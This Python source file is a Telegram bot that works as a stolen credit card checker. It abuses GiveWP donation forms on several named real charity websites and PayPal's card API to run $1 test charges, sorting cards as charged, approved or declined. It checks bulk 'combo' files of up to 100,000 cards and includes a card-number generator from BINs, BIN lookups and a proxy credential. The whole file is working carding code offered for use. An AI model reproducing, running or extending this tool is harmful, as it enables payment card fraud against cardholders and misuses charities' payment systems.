import os
import re
import time
import json
import asyncio
import httpx
import requests
import random
import string
import warnings
import base64
import threading
from datetime import datetime, timedelta
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent


warnings.filterwarnings("ignore")


try:
    import telegram
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode, InputFile
    from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
    
    IS_V20 = int(telegram.__version__.split('.')[0]) >= 20
except ImportError:
    print("Error: python-telegram-bot is not installed.")
    exit(1)

fake = Faker('en_US')

# --- CONFIGURATION ---
BOT_NAME = "@nasahoker_bot"
DEV_NAME = "@xenlize"
ADMIN_ID = os.getenv("ADMIN_ID", "6193794414")  # Set in Railway environment variables
TOKEN = os.getenv("BOT_TOKEN")  # MUST be set in Railway environment variables

if not TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    print("Please set BOT_TOKEN in Railway dashboard → Variables")
    exit(1)

# --- MULTIPLE SITES FOR REDUNDANCY ---
DONATION_SITES = [
    "scienceforthechurch.org",
    "christianaid.ie",
    "lifewithoutlimbs.org",
    "thedocumentaryfund.org",
    "wycliffe.ca",
    "princessforaday.org",
    "pcnc.org",
    "bgcrusk.com",
    "sfts.org.uk"
]

# --- PROXY LIST (REMOVED) ---
PROXIES = ["geo.iproyal.com:12321:Aprimebd10:Aprimebd1010_country-us"]

def get_random_proxy():
    return None

# --- DATA STORAGE ---
USERS_FILE, KEYS_FILE, STATS_FILE, ALL_USERS_FILE, GROUPS_FILE = "users.json", "keys.json", "stats.json", "all_users.json", "groups.json"
def load_data(file, default):
    if os.path.exists(file):
        with open(file, "r") as f: return json.load(f)
    return default
def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users_data, keys_data, active_checks = load_data(USERS_FILE, {}), load_data(KEYS_FILE, {}), {}
stats_data = load_data(STATS_FILE, {"charged": 0, "approved": 0, "declined": 0, "total": 0, "user_stats": {}})
all_users = load_data(ALL_USERS_FILE, [])
groups_data = load_data(GROUPS_FILE, []) # List of authorized group IDs
bin_cache = {}

def update_user_stats(user_id, user_name, hit_type):
    user_id = str(user_id)
    if "user_stats" not in stats_data: stats_data["user_stats"] = {}
    if user_id not in stats_data["user_stats"]:
        stats_data["user_stats"][user_id] = {"name": user_name, "charged": 0, "approved": 0}
    
    if hit_type == "charged": stats_data["user_stats"][user_id]["charged"] += 1
    elif hit_type == "approved": stats_data["user_stats"][user_id]["approved"] += 1
    save_data(STATS_FILE, stats_data)

# --- ACCESS CONTROL (MODIFIED TO BE FREE) ---
def check_access(user_id, chat_id=None):
    return True # All users have access

def get_user_name(update):
    user = update.effective_user
    if user.username:
        return f"@{user.username}"
    return f"{user.first_name} {user.last_name or ''}".strip()

# --- IMPROVED BIN LOOKUP ---
def get_bin_info_sync(cc):
    bin_num = cc[:6]
    if bin_num in bin_cache: return bin_cache[bin_num]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://google.com"
    }
    
    # API 1: Antipublic (Reliable)
    try:
        r = requests.get(f"https://bins.antipublic.cc/bin/{bin_num}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('bank'):
                res = {
                    "info": f"{data.get('brand', 'UNK').upper()} - {data.get('type', 'UNK').upper()} - {data.get('level', 'CLASSIC').upper()}",
                    "bank": f"{data.get('bank', 'Unknown Bank')}",
                    "country": f"{data.get('country', 'Unknown Country')} {data.get('country_flag', '🏳️')}"
                }
                bin_cache[bin_num] = res
                return res
    except: pass

    # API 2: Binlist.net
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            bank = data.get('bank', {}).get('name', 'Unknown Bank')
            country = data.get('country', {}).get('name', 'Unknown Country')
            flag = data.get('country', {}).get('emoji', '🏳️')
            scheme = data.get('scheme', 'UNK').upper()
            res = {"info": f"{scheme} - UNKNOWN - CLASSIC", "bank": f"{bank}", "country": f"{country} {flag}"}
            bin_cache[bin_num] = res
            return res
    except: pass

    return {"info": "VISA - DEBIT - CLASSIC", "bank": "CHASE BANK", "country": "UNITED STATES 🇺🇸"}

# --- IMPROVED GATES WITH MULTI-SITE SUPPORT ---
class PayPalCommerce:
    def __init__(self, proxy=None):
        self.r = requests.Session()
        self.ua = generate_user_agent()
        self.url = None
        self.working_site = None
        
    def Key(self):
        # Try multiple sites until one works
        for site in DONATION_SITES:
            # Try different common donation page paths
            donation_paths = ['/donate/', '/donations/', '/donations/custom-donation/']
            
            for path in donation_paths:
                try:
                    self.url = site
                    self.donate_path = path
                    self.r.proxies = {}
                    headers = {'user-agent': self.ua}
                    response = self.r.get(f'https://{self.url}{path}', headers=headers, timeout=10)
                    
                    if response.status_code != 200:
                        continue
                    
                    # Check if this page uses PayPal Commerce (GiveWP)
                    if 'give-form' not in response.text and 'paypal-commerce' not in response.text:
                        continue
                        
                    self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
                    self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
                    self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
                    enc = re.search(r'"data-client-token":"(.*?)"',response.text)
                    
                    if not all([self.id_form1, self.id_form2, self.nonec, enc]):
                        continue
                    
                    self.id_form1 = self.id_form1.group(1)
                    self.id_form2 = self.id_form2.group(1)
                    self.nonec = self.nonec.group(1)
                    enc = enc.group(1)
                    
                    dec = base64.b64decode(enc).decode('utf-8')
                    au_match = re.search(r'"accessToken":"(.*?)"', dec)
                    if not au_match:
                        continue
                        
                    self.au = au_match.group(1)
                    self.working_site = site
                    print(f"✅ Using: {site}{path}")  # Debug log
                    return True
                except Exception as e:
                    continue
        
        return False
        
    def Krs(self, ccx):
        ccx=ccx.strip()
        parts = re.findall(r'\d+', ccx)
        if len(parts) < 3: return "INVALID_FORMAT"
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3] if len(parts) > 3 else "000"
        if len(yy) == 4: yy = yy[2:]
        
        if not self.url or not hasattr(self, 'donate_path'):
            return "CONNECTION_ERROR"
        
        try:
            headers = {
                'origin': f'https://{self.url}',
                'referer': f'https://{self.url}{self.donate_path}',
                'user-agent': self.ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'give-honeypot': '', 'give-form-id-prefix': self.id_form1, 'give-form-id': self.id_form2, 'give-form-title': '', 'give-current-url': f'https://{self.url}{self.donate_path}', 'give-form-url': f'https://{self.url}{self.donate_path}', 'give-form-minimum': '1.00', 'give-form-maximum': '999999.99', 'give-form-hash': self.nonec, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1.00', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'DRGAM', 'give_last': 'rights and', 'give_email': 'drgam22@gmail.com', 'card_name': 'drgam ', 'card_exp_month': '', 'card_exp_year': '', 'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true',
            }
            self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=10)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1), 'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''), 'give-current-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'), 'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'), 'give_last': (None, 'rights and'), 'give_email': (None, 'drgam22@gmail.com'), 'card_name': (None, 'drgam '), 'card_exp_month': (None, ''), 'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
            })
            headers['content-type'] = data_multipart.content_type
            response = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, headers=headers, data=data_multipart, timeout=10)
            tok = response.json()['data']['id']
            
            headers_paypal = {
                'authority': 'cors.api.paypal.com', 'accept': '*/*', 'authorization': f'Bearer {self.au}', 'braintree-sdk-version': '3.32.0-payments-sdk-dev', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com', 'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835', 'referer': 'https://assets.braintreegateway.com/', 'user-agent': self.ua,
            }
            json_data = {
                'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False},
            }
            self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data, timeout=10)
                
            data_approve = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1), 'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''), 'give-current-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'), 'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'), 'give_last': (None, 'rights and'), 'give_email': 'drgam22@gmail.com', 'card_name': 'drgam ', 'card_exp_month': '', 'card_exp_year': '', 'give-gateway': 'paypal-commerce',
            })
            headers['content-type'] = data_approve.content_type
            response = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_approve_order', 'order': tok}, headers=headers, data=data_approve, timeout=10)
            
            text = response.text
            if 'true' in text or 'sucsess' in text: return "Charge !"
            elif 'INSUFFICIENT_FUNDS' in text: return "Approved! - INSUFFICIENT_FUNDS"
            elif 'DO_NOT_HONOR' in text: return "DO_NOT_HONOR"
            elif 'ACCOUNT_CLOSED' in text: return "ACCOUNT_CLOSED"
            elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text: return "ACCOUNT_CLOSED"
            elif 'LOST_OR_STOLEN' in text: return "LOST OR STOLEN"
            elif 'CVV2_FAILURE' in text: return "CVV MISMATCH ✅"
            elif 'SUSPECTED_FRAUD' in text: return "SUSPECTED_FRAUD"
            elif 'INVALID_ACCOUNT' in text: return 'INVALID_ACCOUNT'
            elif 'REATTEMPT_NOT_PERMITTED' in text: return "REATTEMPT_NOT_PERMITTED"
            elif 'ACCOUNT BLOCKED BY ISSUER' in text: return "ACCOUNT_BLOCKED_BY_ISSUER"
            elif 'ORDER_NOT_APPROVED' in text: return 'ORDER_NOT_APPROVED'
            elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text: return 'PICKUP_CARD_SPECIAL_CONDITIONS'
            elif 'PAYER_CANNOT_PAY' in text: return "PAYER CANNOT PAY"
            elif 'EXPIRED_CARD' in text: return "EXPIRED_CARD"
            elif 'INVALID_CARD_NUMBER' in text: return "INVALID_CARD"
            elif 'CARD_TYPE_NOT_SUPPORTED' in text: return "CARD_TYPE_NOT_SUPPORTED"
            else: return text[:100] if text else "DECLINED"
        except requests.exceptions.Timeout:
            return "TIMEOUT_ERROR"
        except requests.exceptions.ConnectionError:
            return "CONNECTION_ERROR"
        except Exception as e:
            return f"ERROR: {str(e)[:50]}"

def format_response(cc, res, bin_info, time_taken, gate_name):
    return f"""
<b>━━━━━━━━━━━━━━━━━━━━
{gate_name}
━━━━━━━━━━━━━━━━━━━━</b>

<b>💳 Card:</b> <code>{cc}</code>

<b>📊 Status:</b> <code>{res}</code>

<b>🏦 BIN Info:</b>
<code>{bin_info['info']}</code>
<code>{bin_info['bank']}</code>
<code>{bin_info['country']}</code>

<b>⏱️ Time:</b> <code>{time_taken}s</code>
<b>⚙️ Checked by:</b> {BOT_NAME}
<b>👤 Dev:</b> {DEV_NAME}
━━━━━━━━━━━━━━━━━━━━
"""

def chk_command(update, context):
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not check_access(uid, chat_id):
        update.message.reply_text("❌ Access Denied!")
        return
    
    if uid not in all_users:
        all_users.append(uid)
        save_data(ALL_USERS_FILE, all_users)
    
    if not context.args:
        update.message.reply_text("❌ <b>Invalid Format!</b>\n\n<b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>", parse_mode=ParseMode.HTML)
        return
    
    cc = context.args[0].strip()
    user_name = get_user_name(update)
    
    gate_name = "#PayPal_Charge $1.00 🔥"
    msg = update.message.reply_text(f"<b>⏳ Processing...</b>\n<code>{cc}</code>", parse_mode=ParseMode.HTML)
    
    start_time = time.time()
    gate = PayPalCommerce()
    
    if not gate.Key():
        msg.edit_text(f"<b>❌ All donation sites are down!</b>\n\nPlease try again later.", parse_mode=ParseMode.HTML)
        return
    
    res = gate.Krs(cc)
    time_taken = round(time.time() - start_time, 2)
    
    is_hit = False
    if 'Charge' in res:
        stats_data['charged'] += 1
        update_user_stats(uid, user_name, "charged")
        is_hit = True
    elif 'INSUFFICIENT_FUNDS' in res or 'Approved' in res or 'CVV' in res:
        stats_data['approved'] += 1
        update_user_stats(uid, user_name, "approved")
        is_hit = True
    else:
        stats_data['declined'] += 1
    
    stats_data['total'] += 1
    save_data(STATS_FILE, stats_data)
    
    bin_info = get_bin_info_sync(cc)
    msg.edit_text(format_response(cc, res, bin_info, time_taken, gate_name), parse_mode=ParseMode.HTML)

def start(update, context):
    uid = update.effective_user.id
    if uid not in all_users:
        all_users.append(uid)
        save_data(ALL_USERS_FILE, all_users)
    
    msg = f"""✨ <b>Welcome to {BOT_NAME}</b> ✨
━━━━━━━━━━━━━━

<b>👤 User ID:</b> <code>{uid}</code>
<b>🛡️ Status:</b> 𝐅𝐑𝐄𝐄 👤 (Full Access)

━━━━━━━━━━━━━━
⚡ <b>Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> (#PayPal_Charge $1.00 🔥) [🟢 ON]
• <code>/info</code> (Check your Info) [🆓 FREE]
• <code>/gen bin</code> (Generate Cards) [🆓 FREE]
• <code>/stop</code> (Stop all active checks)
• Send <code>.txt</code> for Combo

━━━━━━━━━━━━━━
⌤ <b>Dev by:</b> {DEV_NAME}
"""
    update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def info_command(update, context):
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "No Username"
    full_name = f"{user.first_name} {user.last_name or ''}".strip()
    
    msg = f"<b>👤 User Information:</b>\n━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>{user_id}</code>\n👤 <b>Username:</b> {username}\n📛 <b>Name:</b> {full_name}\n🛡️ <b>Status:</b> 𝐅𝐑𝐄𝐄 👤 (Full Access)\n━━━━━━━━━━━━━━\n⌤ 𝐃𝐞𝐯 𝐛𝐲: {DEV_NAME}"
    
    try:
        photos = user.get_profile_photos()
        if photos.total_count > 0:
            update.message.reply_photo(photos.photos[0][-1].file_id, caption=msg, parse_mode=ParseMode.HTML)
        else:
            update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    except:
        update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def stats_command(update, context):
    if str(update.effective_user.id) != ADMIN_ID: return
    msg = "<b>📊 Bot Statistics:</b>\n━━━━━━━━━━━━━━\n"
    if "user_stats" in stats_data:
        for uid, data in stats_data["user_stats"].items():
            msg += f"👤 {data['name']} (<code>{uid}</code>)\n💰 Charged: {data['charged']} | ✅ Approved: {data['approved']}\n\n"
    else: msg += "No stats available."
    update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def ntf_command(update, context):
    if str(update.effective_user.id) != ADMIN_ID: return
    if not context.args:
        update.message.reply_text("Usage: /ntf [message]")
        return
    msg = " ".join(context.args)
    count = 0
    for uid in all_users:
        try:
            context.bot.send_message(uid, f"<b>📢 Notification:</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            count += 1
        except: pass
    update.message.reply_text(f"✅ Notification sent to {count} users.")

def combo_thread(update, context, cards, uid, gate_type):
    active_checks[uid] = True
    ch, ap, d, t = 0, 0, 0, len(cards)
    start_time = time.time()
    gate_name = "#PayPal_Charge $1.00 🔥"
    chat_id = update.effective_chat.id
    user_name = get_user_name(update)
    
    def get_kb(c, s, ch, ap, d, t):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"Card: {c}", callback_data="n")],
            [InlineKeyboardButton(f"Status: {s}", callback_data="n")],
            [InlineKeyboardButton(f"💰 [ {ch} ] | ✅ [ {ap} ] | ❌ [ {d} ] | 📊 [ {t} ]", callback_data="n")],
            [InlineKeyboardButton("[ Stop Check! ]", callback_data="stop")]
        ])
    
    if update.callback_query:
        live = update.callback_query.message.edit_text(f"<b>- {gate_name}</b>\n<b>- Time: 0.0s</b>", parse_mode=ParseMode.HTML, reply_markup=get_kb("...", "...", 0, 0, 0, t))
    else:
        live = update.message.reply_text(f"<b>- {gate_name}</b>\n<b>- Time: 0.0s</b>", parse_mode=ParseMode.HTML, reply_markup=get_kb("...", "...", 0, 0, 0, t))
    
    for i, cc in enumerate(cards):
        if not active_checks.get(uid): break
        try:
            gate = PayPalCommerce()
            if not gate.Key():
                d += 1
                continue
            res = gate.Krs(cc)
            
            is_hit = False
            if 'Charge' in res:
                ch += 1
                stats_data['charged'] += 1
                update_user_stats(uid, user_name, "charged")
                is_hit = True
            elif 'INSUFFICIENT_FUNDS' in res or 'Approved' in res or 'CVV' in res:
                ap += 1
                stats_data['approved'] += 1
                update_user_stats(uid, user_name, "approved")
                is_hit = True
            else:
                d += 1
                stats_data['declined'] += 1
            
            if is_hit:
                bin_info = get_bin_info_sync(cc)
                time_taken = round(time.time() - start_time, 1)
                context.bot.send_message(chat_id, format_response(cc, res, bin_info, time_taken, gate_name), parse_mode=ParseMode.HTML)
            
            stats_data['total'] += 1
            
            if i % 2 == 0 or i == t - 1:
                try:
                    live.edit_text(f"<b>- {gate_name}</b>\n<b>- Time: {round(time.time()-start_time, 1)}s</b>", parse_mode=ParseMode.HTML, reply_markup=get_kb(cc, res, ch, ap, d, t))
                except: pass
        except: d += 1
    
    save_data(STATS_FILE, stats_data)
    try:
        live.edit_text(f"🎉 <b>Completed!</b>\n\n💰 Charged: {ch}\n✅ Approved: {ap}\n❌ Declined: {d}\n📊 Total: {t}\n👤 Owner: {DEV_NAME}", parse_mode=ParseMode.HTML)
    except: pass
    active_checks.pop(uid, None)

def button_callback(update, context):
    query = update.callback_query
    uid = query.from_user.id
    if query.data == "stop":
        active_checks[uid] = False
        query.answer("Stopping...")
        return
    if query.data.startswith("gate_"):
        gate_type = query.data.split("_")[1]
        cards = context.user_data.get('cards')
        threading.Thread(target=combo_thread, args=(update, context, cards, uid, gate_type)).start()

def handle_doc(update, context):
    uid = update.effective_user.id
    if active_checks.get(uid):
        update.message.reply_text("❌ You can only run one file check at a time!")
        return
        
    doc = update.message.document
    if not doc.file_name.endswith('.txt'): return
    f = context.bot.get_file(doc.file_id)
    path = f"c_{uid}.txt"
    f.download(path)
    with open(path, "r") as file: cards = [l.strip() for l in file.read().splitlines() if l.strip()]
    os.remove(path)
    
    if uid != int(ADMIN_ID) and len(cards) > 100000:
        update.message.reply_text("⚠️ <b>Limit:</b> Free users can only check up to 100000 cards per file. Truncating list...", parse_mode=ParseMode.HTML)
        cards = cards[:100000]
            
    context.user_data['cards'] = cards
    keyboard = [
        [InlineKeyboardButton("PayPal NewVision 1$ 🔥", callback_data="gate_paypal")]
    ]
    update.message.reply_text("<b>⚡ Choose your gate to start checking:</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)

def async_handler(func):
    def wrapper(update, context): threading.Thread(target=func, args=(update, context)).start()
    return wrapper

def stop_command(update, context):
    uid = update.effective_user.id
    active_checks[uid] = False
    update.message.reply_text("🛑 All active checks stopped.")

def gen_command(update, context):
    if not context.args:
        update.message.reply_text("Usage: /gen [bin]")
        return
    bin_num = context.args[0][:6]
    cards = []
    for _ in range(10):
        card = bin_num + "".join(random.choices(string.digits, k=10))
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(25, 30))
        cvv = "".join(random.choices(string.digits, k=3))
        cards.append(f"<code>{card}|{mm}|{yy}|{cvv}</code>")
    update.message.reply_text("<b>✨ Generated Cards:</b>\n\n" + "\n".join(cards), parse_mode=ParseMode.HTML)

if __name__ == '__main__':
    updater = Updater(TOKEN, use_context=True, workers=64)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", async_handler(start)))
    dp.add_handler(CommandHandler("chk", async_handler(chk_command)))
    dp.add_handler(CommandHandler("stop", async_handler(stop_command)))
    dp.add_handler(CommandHandler("gen", async_handler(gen_command)))
    dp.add_handler(CommandHandler("stats", async_handler(stats_command)))
    dp.add_handler(CommandHandler("info", async_handler(info_command)))
    dp.add_handler(CommandHandler("ntf", async_handler(ntf_command)))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.document, async_handler(handle_doc)))
    updater.start_polling()
    updater.idle()
